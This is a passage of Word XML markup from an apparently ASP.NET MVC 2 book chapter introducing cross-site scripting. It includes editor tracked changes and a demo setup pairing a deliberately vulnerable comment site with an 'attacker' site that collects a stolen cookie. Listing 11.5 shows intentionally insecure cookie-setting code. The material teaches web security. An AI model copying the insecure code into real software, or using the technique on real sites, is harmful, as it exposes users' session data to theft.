        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve"> vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="007305C4">
        <w:instrText>vulnerabilities</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve"> inherent in web applications.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3368B" w:rsidRDefault="00B3368B" w:rsidP="00B3368B">
      <w:pPr>
        <w:pStyle w:val="Head1"/>
      </w:pPr>
      <w:r>
        <w:t>11.2 C</w:t>
      </w:r>
      <w:r w:rsidR="00D17F2F">
        <w:t>ross-</w:t>
      </w:r>
      <w:r>
        <w:t>Site Scripting</w:t>
      </w:r>
      <w:ins w:id="84" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="000D32C6">
        <w:rPr>
          <w:rPrChange w:id="85" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>Cross-Site Scripting</w:instrText>
      </w:r>
      <w:ins w:id="86" w:author="Jeffrey" w:date="2010-03-15T16:30:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> (XSS</w:t>
      </w:r>
      <w:ins w:id="87" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="88" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="89" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EC5FDA" w:rsidRPr="00EC5FDA" w:rsidRDefault="00D17F2F" w:rsidP="00EC5FDA">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-</w:t>
      </w:r>
      <w:r w:rsidR="006E6069">
        <w:t xml:space="preserve">site scripting </w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t>is a technique where a malicious</w:t>
      </w:r>
      <w:ins w:id="90" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00833928" w:rsidRPr="006872B1">
        <w:rPr>
          <w:rPrChange w:id="91" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>malicious</w:instrText>
      </w:r>
      <w:ins w:id="92" w:author="Jeffrey" w:date="2010-03-15T16:32:00Z">
        <w:r w:rsidR="00833928">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00833928">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00303323">
        <w:t xml:space="preserve"> user manipulates the system so that special JavaScript</w:t>
      </w:r>
      <w:ins w:id="93" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="94" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="95" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00303323">
        <w:t xml:space="preserve"> appears on the vuln</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>erable</w:t>
      </w:r>
      <w:ins w:id="96" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="97" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="98" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:commentRangeStart w:id="99"/>
      <w:commentRangeStart w:id="100"/>
      <w:r w:rsidR="009E1636">
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>ebsite</w:t>
      </w:r>
      <w:ins w:id="101" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="005A7671">
        <w:rPr>
          <w:rPrChange w:id="102" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable website</w:instrText>
      </w:r>
      <w:ins w:id="103" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000968D7">
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>script</w:t>
      </w:r>
      <w:r w:rsidR="00FE0F71">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:commentRangeEnd w:id="99"/>
      <w:r w:rsidR="00430E59">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:vanish/>
        </w:rPr>
        <w:commentReference w:id="99"/>
      </w:r>
      <w:commentRangeStart w:id="104"/>
      <w:commentRangeStart w:id="105"/>
      <w:commentRangeEnd w:id="100"/>
      <w:r>
        <w:commentReference w:id="100"/>
      </w:r>
      <w:r w:rsidR="00FE0F71">
        <w:t>that</w:t>
      </w:r>
      <w:commentRangeEnd w:id="104"/>
      <w:r w:rsidR="001F537D">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
          <w:vanish/>
        </w:rPr>
        <w:commentReference w:id="104"/>
      </w:r>
      <w:commentRangeEnd w:id="105"/>
      <w:r w:rsidR="00182573">
        <w:commentReference w:id="105"/>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve"> v</w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t xml:space="preserve">isiting browsers </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve">subsequently </w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t>execute</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>. Traditionally</w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t xml:space="preserve"> that malicious script sends a request to a third-party site containing sensitive data.  That's the cross-site part.  A user puts a script on one site that sends</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve"> secret data </w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t xml:space="preserve">to another, conspiring site. The trick </w:t>
      </w:r>
      <w:r w:rsidR="00FE0F71">
        <w:t xml:space="preserve">for the hacker </w:t>
      </w:r>
      <w:r w:rsidR="00303323">
        <w:t>is to actually get the script to run on the vulnerable site.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="003B62DA" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="Head2"/>
      </w:pPr>
      <w:r>
        <w:t>11.2.1 XSS</w:t>
      </w:r>
      <w:ins w:id="106" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="107" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="108" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> In Action</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRPr="00303323" w:rsidRDefault="00303323" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In the source code for this book we've included a sample </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve">Visual Studio solution </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">that you can run to </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>perform</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>simulated, local</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> XSS</w:t>
      </w:r>
      <w:ins w:id="109" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="009835A9">
        <w:rPr>
          <w:rPrChange w:id="110" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>XSS</w:instrText>
      </w:r>
      <w:ins w:id="111" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> attack</w:t>
      </w:r>
      <w:ins w:id="112" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="113" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="114" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve">.  It contains two simple </w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve">ASP.NET </w:t>
      </w:r>
      <w:r>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> applications.  </w:t>
      </w:r>
      <w:commentRangeStart w:id="115"/>
      <w:commentRangeStart w:id="116"/>
      <w:r>
        <w:t>One is vulne</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>rable</w:t>
      </w:r>
      <w:ins w:id="117" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="118" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="119" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve"> to cross site scripting</w:t>
      </w:r>
      <w:commentRangeEnd w:id="115"/>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve"> XE "</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC" w:rsidRPr="00AC59FB">
        <w:instrText>cross site scripting</w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:instrText xml:space="preserve">" </w:instrText>
      </w:r>
      <w:r w:rsidR="004962CC">
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:ins w:id="120" w:author="Jeffrey" w:date="2010-03-15T16:39:00Z">
        <w:r w:rsidR="009715ED">
          <w:t xml:space="preserve"> in Internet Explorer (other browsers vary)</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00BE308B">
        <w:commentReference w:id="115"/>
      </w:r>
      <w:commentRangeEnd w:id="116"/>
      <w:r w:rsidR="00C068E0">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="116"/>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">It features a simple comment submission page. </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>We'll submit JavaScript</w:t>
      </w:r>
      <w:ins w:id="121" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00630D9B">
        <w:rPr>
          <w:rPrChange w:id="122" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>JavaScript</w:instrText>
      </w:r>
      <w:ins w:id="123" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve"> as part of the comment</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t>, and our vulnerable web site will render the JavaScript as if it were legitimate</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The other </w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>website</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the at</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve">tacker. </w:t>
      </w:r>
      <w:r>
        <w:t>It simply collects submissions so we can see if our attack worked.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00303323" w:rsidRDefault="00303323" w:rsidP="00303323">
      <w:pPr>
        <w:pStyle w:val="Head3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Preparing the example</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body1"/>
      </w:pPr>
      <w:r>
        <w:t>When the example Visual Studio solution is run (typically with CTRL-F5), two sites appear in the web browser.  The vulnerable</w:t>
      </w:r>
      <w:ins w:id="124" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="125" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="126" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> site sets a cookie</w:t>
      </w:r>
      <w:ins w:id="127" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="128" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="129" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>, ostensibly containing sensitive data. The second site is the attacker</w:t>
      </w:r>
      <w:r w:rsidR="002921BB">
        <w:t>, it will collect the data from our evil request</w:t>
      </w:r>
      <w:r>
        <w:t>.  The attacking site has a page that should read "</w:t>
      </w:r>
      <w:r w:rsidRPr="00620AFB">
        <w:t>No victims yet</w:t>
      </w:r>
      <w:r>
        <w:t>".  After we initiate our attack</w:t>
      </w:r>
      <w:ins w:id="130" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00D21A77">
        <w:rPr>
          <w:rPrChange w:id="131" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>attack</w:instrText>
      </w:r>
      <w:ins w:id="132" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t>, it will display the "secret" cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Body"/>
      </w:pPr>
      <w:r>
        <w:t>On the vulnerable</w:t>
      </w:r>
      <w:ins w:id="133" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00DB5CBF" w:rsidRPr="00EF6E66">
        <w:rPr>
          <w:rPrChange w:id="134" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>vulnerable</w:instrText>
      </w:r>
      <w:ins w:id="135" w:author="Jeffrey" w:date="2010-03-15T16:34:00Z">
        <w:r w:rsidR="00DB5CBF">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="00DB5CBF">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> site, the cookie</w:t>
      </w:r>
      <w:ins w:id="136" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="137" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="138" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> has been set with the code i</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r w:rsidR="00C37697">
        <w:t>l</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>isting 11</w:t>
      </w:r>
      <w:r w:rsidR="00A96356">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009E1636">
        <w:t>5, traditional cookie-setting code</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="CodeListingCaption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 11.5 Setting an insecure cookie</w:t>
      </w:r>
      <w:ins w:id="139" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="140" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="141" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> with "secret" data</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRPr="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00620AFB">
        <w:t>public ActionResult Index()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r w:rsidRPr="00620AFB">
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRPr="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00620AFB">
        <w:t>var cookie</w:t>
      </w:r>
      <w:ins w:id="142" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="143" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="144" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00620AFB">
        <w:t xml:space="preserve"> = new HttpCookie("mvcinaction", "secret");</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00620AFB">
        <w:t>Response.SetCookie(cookie</w:t>
      </w:r>
      <w:ins w:id="145" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve"> XE "</w:instrText>
        </w:r>
      </w:ins>
      <w:r w:rsidR="004962CC" w:rsidRPr="00A554BF">
        <w:rPr>
          <w:rPrChange w:id="146" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:instrText>cookie</w:instrText>
      </w:r>
      <w:ins w:id="147" w:author="Jeffrey" w:date="2010-03-15T16:31:00Z">
        <w:r w:rsidR="004962CC">
          <w:instrText xml:space="preserve">" </w:instrText>
        </w:r>
        <w:r w:rsidR="004962CC">
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00620AFB">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620AFB" w:rsidRPr="00620AFB" w:rsidRDefault="00620AFB" w:rsidP="00620AFB">
      <w:pPr>
        <w:pStyle w:val="Code"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00620AFB">
        <w:t>return View();</w:t>
      </w:r>
    </w:p>
